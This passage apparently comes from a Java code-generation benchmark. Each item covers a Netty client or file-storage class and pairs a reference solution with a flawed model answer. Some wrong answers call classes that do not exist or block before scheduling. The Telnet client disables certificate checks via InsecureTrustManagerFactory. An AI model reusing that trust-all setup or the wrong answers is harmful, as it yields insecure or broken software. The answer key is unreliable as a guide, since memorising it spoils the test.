releases resources\n- getWebSocketClientExtensionHandler(): WebSocketClientExtensionHandler -> WebSocketClientExtensionHandler - Returns the WebSocket extension handler (defaults to compression handler)\n- getWebSocketClientHandler(WebSocketClientHandshaker, WebSocketClientHandler.WebSocketMessageHandler): WebSocketClientHandler -> WebSocketClientHandler - Creates and returns a custom WebSocket client handler with ping/pong and channel state management",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.codec.http.websocketx.extensions.WebSocketClientExtensionHandler;\nimport io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketClientCompressionHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.proxy.Socks5ProxyHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.internal.SocketUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.URI;\nimport java.time.Duration;\n\npublic class NettyTcpClient {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n    private static final Duration DEFAULT_CONNECTION_TIMEOUT = Duration.ofSeconds(10);\n    private static final int DEFAULT_IDLE_TIMEOUT = 15;\n\n    private URI uri;\n    private Channel webSocketChannel;\n    private NioEventLoopGroup eventLoopGroup;\n    private boolean compressedMessages = false;\n    private boolean acceptAllCertificates = false;\n    private boolean enableLoggingHandler = false;\n    private LogLevel loggingHandlerLevel = LogLevel.DEBUG;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public void connect() {\n        try {\n            String scheme = uri.getScheme() == null ? \"ws\" : uri.getScheme();\n            String host = uri.getHost();\n            if (host == null) {\n                throw new IllegalArgumentException(\"Host cannot be null.\");\n            }\n\n            final int port = uri.getPort() == -1 ? \n                (\"ws\".equalsIgnoreCase(scheme) ? 80 : 443) : uri.getPort();\n\n            final boolean ssl = \"wss\".equalsIgnoreCase(scheme);\n            final SslContext sslCtx = ssl ? \n                SslContextBuilder.forClient()\n                    .trustManager(acceptAllCertificates ? InsecureTrustManagerFactory.INSTANCE : null)\n                    .build() : null;\n\n            WebSocketClientHandler handler = getWebSocketClientHandler(\n                WebSocketClientHandshakerFactory.newHandshaker(\n                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536),\n                message -> {});\n\n            if (eventLoopGroup == null || eventLoopGroup.isShutdown()) {\n                eventLoopGroup = new NioEventLoopGroup(2);\n            }\n\n            new Bootstrap()\n                .group(eventLoopGroup)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, \n                    (int) DEFAULT_CONNECTION_TIMEOUT.toMillis())\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        if (socksProxyHost != null) {\n                            p.addLast(new Socks5ProxyHandler(\n                                SocketUtils.socketAddress(socksProxyHost, socksProxyPort)));\n                        }\n                        if (sslCtx != null) {\n                            p.addLast(sslCtx.newHandler(ch.alloc(), host, port));\n                        }\n                        p.addLast(new HttpClientCodec());\n                        if (enableLoggingHandler) {\n                            p.addLast(new LoggingHandler(loggingHandlerLevel));\n                        }\n                        if (compressedMessages) {\n                            p.addLast(WebSocketClientCompressionHandler.INSTANCE);\n                        }\n                        p.addLast(new HttpObjectAggregator(8192));\n                        if (DEFAULT_IDLE_TIMEOUT > 0) {\n                            p.addLast(new IdleStateHandler(DEFAULT_IDLE_TIMEOUT, 0, 0));\n                        }\n                        WebSocketClientExtensionHandler clientExtensionHandler = \n                            getWebSocketClientExtensionHandler();\n                        if (clientExtensionHandler != null) {\n                            p.addLast(clientExtensionHandler);\n                        }\n                        p.addLast(handler);\n                    }\n                })\n                .connect(uri.getHost(), port)\n                .addListener((ChannelFuture channelFuture) -> {\n                    webSocketChannel = channelFuture.channel();\n                    if (!channelFuture.isSuccess()) {\n                        LOG.error(\"Connection failed\", channelFuture.cause());\n                    }\n                });\n        } catch (Exception e) {\n            LOG.error(\"Connection error\", e);\n        }\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully(2, DEFAULT_IDLE_TIMEOUT, TimeUnit.SECONDS);\n        }\n    }\n\n    protected WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return WebSocketClientCompressionHandler.INSTANCE;\n    }\n\n    protected WebSocketClientHandler getWebSocketClientHandler(\n        WebSocketClientHandshaker handshaker,\n        WebSocketClientHandler.WebSocketMessageHandler handler) {\n        return new WebSocketClientHandler(handshaker, handler) {\n            @Override\n            public void channelInactive(ChannelHandlerContext ctx) {\n                LOG.info(\"Channel inactive\");\n                ctx.close();\n            }\n\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                if (evt instanceof IdleStateEvent) {\n                    IdleStateEvent e = (IdleStateEvent) evt;\n                    if (e.state() == IdleState.READER_IDLE) {\n                        ctx.writeAndFlush(new PingWebSocketFrame());\n                    }\n                }\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyTcpClient {\n    private final Logger LOG;\n    private final URI uri;\n    private Channel webSocketChannel;\n    private final NioEventLoopGroup eventLoopGroup;\n    private final boolean compressedMessages;\n    private final boolean acceptAllCertificates;\n    private final boolean enableLoggingHandler;\n    private final LogLevel loggingHandlerLevel;\n    private final String socksProxyHost;\n    private final int socksProxyPort;\n\n    public NettyTcpClient(Logger LOG, URI uri, boolean compressedMessages, boolean acceptAllCertificates, boolean enableLoggingHandler, LogLevel loggingHandlerLevel, String socksProxyHost, int socksProxyPort) {\n        this.LOG = LOG;\n        this.uri = uri;\n        this.compressedMessages = compressedMessages;\n        this.acceptAllCertificates = acceptAllCertificates;\n        this.enableLoggingHandler = enableLoggingHandler;\n        this.loggingHandlerLevel = loggingHandlerLevel;\n        this.socksProxyHost = socksProxyHost;\n        this.socksProxyPort = socksProxyPort;\n        this.eventLoopGroup = new NioEventLoopGroup();\n    }\n\n    public void connect() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n\n                        if (enableLoggingHandler) {\n                            pipeline.addLast(new LoggingHandler(loggingHandlerLevel));\n                        }\n\n                        if (socksProxyHost != null && !socksProxyHost.isEmpty()) {\n                            pipeline.addLast(new SocksProxyHandler(socksProxyHost, socksProxyPort));\n                        }\n\n                        if (acceptAllCertificates) {\n                            SslContext sslContext = SslContextBuilder.forClient()\n                                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                                    .build();\n                            pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                        }\n\n                        pipeline.addLast(getWebSocketClientExtensionHandler());\n\n                        WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                                uri, WebSocketVersion.V13, getWebSocketClientExtensionHandler(), false, null);\n\n                        WebSocketClientHandler.WebSocketMessageHandler defaultMessageHandler = (frame) -> {\n                            LOG.info(\"Received message: \" + frame.text());\n                        };\n\n                        pipeline.addLast(getWebSocketClientHandler(handshaker, defaultMessageHandler));\n                        pipeline.addLast(new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS));\n                    }\n                });\n\n        ChannelFuture future = bootstrap.connect(uri.getHost(), uri.getPort()).sync();\n        webSocketChannel = future.channel();\n        future.channel().closeFuture().sync();\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null && webSocketChannel.isOpen()) {\n            webSocketChannel.close().sync();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully();\n        }\n    }\n\n    public WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        WebSocketClientExtensionHandler handler = new WebSocketClientExtensionHandler();\n        if (compressedMessages) {\n            handler.addExtension(WebSocketClientExtensionHandler.CompressionExtension.getInstance());\n        }\n        return handler;\n    }\n\n    public WebSocketClientHandler getWebSocketClientHandler(WebSocketClientHandshaker handshaker, WebSocketClientHandler.WebSocketMessageHandler messageHandler) {\n        return new WebSocketClientHandler(handshaker, messageHandler);\n    }\n}"
  },
  {
    "Task_id": 15,
    "Instruction": "Task Description: Implement a thread-safe file storage class that provides efficient read/write operations using Java NIO's FileChannel with proper resource management and concurrency control.\n\nClass Description: CachedOpenFile is a storage implementation that manages file operations using FileChannel, providing thread-safe access through read-write locks. It supports reading and writing data blocks at specific offsets, capacity management, and ensures proper file handling.\n\nAttributes:\n- fc: FileChannel - The file channel used for all file operations\n- lock: ReadWriteLock - Provides thread-safe access control for file operations\n- capacity: long - The maximum capacity of the storage unit\n\nMethods:\n- Constructor: CachedOpenFile(Path file, long capacity) -> void - Initializes the file channel with given path and capacity, creating parent directories if needed\n- readBlock: readBlock(ByteBuffer buffer, long offset) -> int - Reads data from the specified offset into the buffer\n- writeBlock: writeBlock(ByteBuffer buffer, long offset) -> int - Writes data from the buffer to the specified offset\n- writeBlock: writeBlock(ByteBufferView buffer, long offset) -> int - Writes data from a ByteBufferView to the specified offset\n- capacity: capacity() -> long - Returns the maximum capacity of the storage\n- size: size() -> long - Returns the current size of the file\n- flush: flush() -> void - Forces any changes to be written to disk\n- lockForIoOperation: lockForIoOperation() -> void - Acquires a read lock for IO operations\n- unlockForIoOperation: unlockForIoOperation() -> void - Releases the read lock after IO operations\n- close: close() -> void - Closes the file channel and releases all resources\n- ensureOpen: ensureOpen() -> void - Private method to verify the file channel is open before operations",
    "Canonical_solution": "import bt.data.StorageUnit;\nimport bt.net.buffer.ByteBufferView;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReadWriteLock;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\nclass CachedOpenFile implements StorageUnit {\n    private final FileChannel fc;\n    private final ReadWriteLock lock = new ReentrantReadWriteLock();\n    private final long capacity;\n\n    CachedOpenFile(Path file, long capacity) {\n        try {\n            Path parent = file.getParent();\n            if (parent != null) {\n                Files.createDirectories(parent);\n            }\n            fc = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        } catch (IOException ex) {\n            throw new UncheckedIOException(\"Could not open file \" + file.toAbsolutePath(), ex);\n        }\n        this.capacity = capacity;\n    }\n\n    @Override\n    public int readBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to read past the end of file (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.read(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to read bytes (offset: \" + offset +\n                    \", requested block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBuffer buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return fc.write(buffer, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public int writeBlock(ByteBufferView buffer, long offset) {\n        ensureOpen();\n\n        if (offset < 0) {\n            throw new IllegalArgumentException(\"Negative offset: \" + offset);\n        } else if (offset > capacity - buffer.remaining()) {\n            throw new IllegalArgumentException(\"Received a request to write past the end of file (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity);\n        }\n\n        try {\n            return buffer.transferTo(fc, offset);\n        } catch (IOException e) {\n            throw new UncheckedIOException(\"Failed to write bytes (offset: \" + offset +\n                    \", block length: \" + buffer.remaining() + \", file capacity: \" + capacity + \")\", e);\n        }\n    }\n\n    @Override\n    public long capacity() {\n        return capacity;\n    }\n\n    @Override\n    public long size() {\n        ensureOpen();\n        try {\n            return fc.size();\n        } catch (IOException ex) {\n            throw new UncheckedIOException(ex);\n        }\n    }\n\n    public void flush() throws IOException {\n        if (fc.isOpen())\n            this.fc.force(false);\n    }\n\n    public void lockForIoOperation() {\n        this.lock.readLock().lock();\n    }\n\n    public void unlockForIoOperation() {\n        this.lock.readLock().unlock();\n    }\n\n    @Override\n    public void close() throws IOException {\n        lock.writeLock().lock();\n        try {\n            this.fc.close();\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    private void ensureOpen() {\n        if (!fc.isOpen()) {\n            throw new IllegalStateException(\"Cannot access a closed file.\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class CachedOpenFile {\n    private final FileChannel fc;\n    private final ReadWriteLock lock;\n    private final long capacity;\n\n    public CachedOpenFile(Path file, long capacity) throws IOException {\n        Files.createDirectories(file.getParent());\n        fc = FileChannel.open(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        lock = new ReentrantReadWriteLock();\n        this.capacity = capacity;\n    }\n\n    public int readBlock(ByteBuffer buffer, long offset) throws IOException {\n        ensureOpen();\n        lock.readLock().lock();\n        try {\n            fc.position(offset);\n            return fc.read(buffer);\n        } finally {\n            lock.readLock().unlock();\n        }\n    }\n\n    public int writeBlock(ByteBuffer buffer, long offset) throws IOException {\n        ensureOpen();\n        lock.writeLock().lock();\n        try {\n            fc.position(offset);\n            return fc.write(buffer);\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public int writeBlock(ByteBufferView buffer, long offset) throws IOException {\n        ensureOpen();\n        lock.writeLock().lock();\n        try {\n            fc.position(offset);\n            return fc.write(buffer);\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public long capacity() {\n        return capacity;\n    }\n\n    public long size() throws IOException {\n        ensureOpen();\n        return fc.size();\n    }\n\n    public void flush() throws IOException {\n        ensureOpen();\n        fc.force(true);\n    }\n\n    public void lockForIoOperation() {\n        lock.readLock().lock();\n    }\n\n    public void unlockForIoOperation() {\n        lock.readLock().unlock();\n    }\n\n    public void close() throws IOException {\n        if (fc != null) {\n            fc.close();\n        }\n    }\n\n    private void ensureOpen() throws IOException {\n        if (!fc.isOpen()) {\n            throw new IOException(\"File channel is closed\");\n        }\n    }\n}"
  },
  {
    "Task_id": 150,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server and handle echo messages.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified host and port, and handles incoming and outgoing messages through a custom handler. It manages network resources and ensures proper cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- EchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Initializes and starts the Netty client, establishes connection to the remote server, and manages the connection lifecycle. Throws Exception if any error occurs during the process",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, port))\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new EchoClientHandler());\n                    }\n                });\n            ChannelFuture f = b.connect().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         public void initChannel(SocketChannel ch) throws Exception {\n                             ch.pipeline().addLast(new EchoClientHandler());\n                         }\n                     })\n                     .option(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private class EchoClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            String message = \"Hello, Server!\";\n            ByteBuf buf = Unpooled.copiedBuffer(message);\n            ctx.writeAndFlush(buf);\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf in = (ByteBuf) msg;\n            try {\n                byte[] content = new byte[in.readableBytes()];\n                in.readBytes(content);\n                String response = new String(content, CharsetUtil.UTF_8);\n                System.out.println(\"Server echoed: \" + response);\n            } finally {\n                in.release();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 152,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: MyClient is a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly. The client uses custom encoders/decoders and handlers for message processing.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server to connect to\n\nMethods:\nconstructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\nrun: run() -> void - Main method that establishes the connection, sends periodic messages, and manages resources. Throws InterruptedException for thread-related operations\ninitChannel: initChannel(SocketChannel ch) -> void - Configures the channel pipeline with custom encoders, decoders, and handlers (internal method within ChannelInitializer)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\", new MyDecoder());\n                    ch.pipeline().addLast(\"encoder\", new MyEncoder());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class MyClient {\n    private final String host;\n    private final int port;\n    private Channel channel;\n    private Bootstrap bootstrap;\n    private ScheduledExecutorService scheduler;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new MessageEncoder());\n                             ch.pipeline().addLast(new MessageDecoder());\n                             ch.pipeline().addLast(new MyHandler());\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            channel = future.channel();\n            future.channel().closeFuture().sync();\n\n            scheduler = Executors.newScheduledThreadPool(1);\n            scheduler.scheduleAtFixedRate(() -> {\n                try {\n                    String poem = getPoem();\n                    if (channel.isActive()) {\n                        channel.writeAndFlush(poem);\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }, 0, 5, TimeUnit.SECONDS);\n\n        } finally {\n            group.shutdownGracefully();\n            if (scheduler != null) {\n                scheduler.shutdown();\n            }\n        }\n    }\n\n    private String getPoem() {\n        String[] poems = {\n            \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\",\n            \"\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\",\n            \"\u6625\u7720\u4e0d\u89c9\u6653\uff0c\u5904\u5904\u95fb\u557c\u9e1f\u3002\",\n            \"\u591c\u6765\u98ce\u96e8\u58f0\uff0c\u82b1\u843d\u77e5\u591a\u5c11\u3002\",\n            \"\u767d\u65e5\u4f9d\u5c71\u5c3d\uff0c\u9ec4\u6cb3\u5165\u6d77\u6d41\u3002\",\n            \"\u6b32\u7a77\u5343\u91cc\u76ee\uff0c\u66f4\u4e0a\u4e00\u5c42\u697c\u3002\"\n        };\n        int index = (int) (Math.random() * poems.length);\n        return poems[index];\n    }\n\n    private class MessageEncoder extends ChannelOutboundHandlerAdapter {\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {\n            ByteBuf buffer = Unpooled.copiedBuffer((String) msg, CharsetUtil.UTF_8);\n            ctx.write(buffer, promise);\n        }\n    }\n\n    private class MessageDecoder extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            ByteBuf buffer = (ByteBuf) msg;\n            byte[] bytes = new byte[buffer.readableBytes()];\n            buffer.readBytes(bytes);\n            String str = new String(bytes, CharsetUtil.UTF_8);\n            ctx.fireChannelRead(str);\n            buffer.release();\n        }\n    }\n\n    private class MyHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n            System.out.println(\"Received: \" + msg);\n        }\n    }\n}"
  },
  {
    "Task_id": 153,
    "Instruction": "Task Description: Create a TCP client using Java Netty framework that can establish a secure/non-secure connection to a remote server, send messages from standard input, and gracefully handle connection termination.\n\nClass Description: TelnetClient is a Netty-based TCP client that connects to a specified host and port, supports SSL/TLS encryption when configured, and provides interactive message sending capability through standard input.\n\nAttributes:\nSSL: static final boolean - Flag indicating whether SSL/TLS encryption should be used\nHOST: static final String - The host address to connect to (default: \"127.0.0.1\")\nPORT: static final int - The port number to connect to (default: 8992 for SSL, 8023 for non-SSL)\n\nMethods:\nstart: void() throws Exception - Main method that initializes the Netty client, establishes connection, handles user input, and manages connection lifecycle\n  - Initializes SSL context if SSL is enabled\n  - Creates and configures Netty Bootstrap with NioEventLoopGroup\n  - Establishes connection to specified host and port\n  - Reads input from console and sends to server\n  - Handles graceful shutdown on \"bye\" command or connection close",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic final class TelnetClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new TelnetClientInitializer(sslCtx));\n\n            Channel ch = b.connect(HOST, PORT).sync().channel();\n\n            ChannelFuture lastWriteFuture = null;\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                String line = in.readLine();\n                if (line == null) {\n                    break;\n                }\n\n                lastWriteFuture = ch.writeAndFlush(line + \"\\r\\n\");\n\n                if (\"bye\".equals(line.toLowerCase())) {\n                    ch.closeFuture().sync();\n                    break;\n                }\n            }\n\n            if (lastWriteFuture != null) {\n                lastWriteFuture.sync();\n            }\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class TelnetClient {\n    public static final boolean SSL = false;\n    public static final String HOST = \"127.0.0.1\";\n    public static final int PORT;\n\n    static {\n        PORT = SSL ? 8992 : 8023;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            if (SSL) {\n                                SslContext sslContext = SslContextBuilder.forClient()\n                                        .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                                        .build();\n                                pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                            }\n                            pipeline.addLast(new TelnetClientHandler());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(HOST, PORT).sync();\n            Channel channel = future.channel();\n\n            Thread inputThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        if (line.trim().equalsIgnoreCase(\"bye\")) {\n                            channel.writeAndFlush(line + \"\\n\");\n                            channel.closeFuture().sync();\n                            break;\n                        } else {\n                            channel.writeAndFlush(line + \"\\n\");\n                        }\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n            inputThread.start();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class TelnetClientHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ByteBuf buf = (ByteBuf) msg;\n            try {\n                String str = buf.toString(CharsetUtil.UTF_8);\n                System.out.println(str);\n            } finally {\n                buf.release();\n            }\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            System.out.println(\"Connected to server.\");\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            System.out.println(\"Connection closed.\");\n        